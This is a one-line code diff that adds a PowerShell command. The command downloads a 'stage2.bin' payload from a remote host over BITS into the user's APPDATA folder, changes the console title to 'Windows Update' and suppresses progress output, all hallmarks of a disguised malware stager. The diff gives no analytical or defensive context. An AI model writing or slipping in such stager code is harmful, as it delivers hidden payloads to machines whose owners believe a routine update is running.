@@ -1,0 +1,1 @@
+$Stage2Url = 'http://internal.corp:80/stage2.bin'; $WorkingPath = "$env:APPDATA\stage2.bin"; Start-BitsTransfer -Source $Stage2Url -Destination $WorkingPath; $Host.UI.RawUI.WindowTitle = "Windows Update"; $ProgressPreference = "SilentlyContinue"
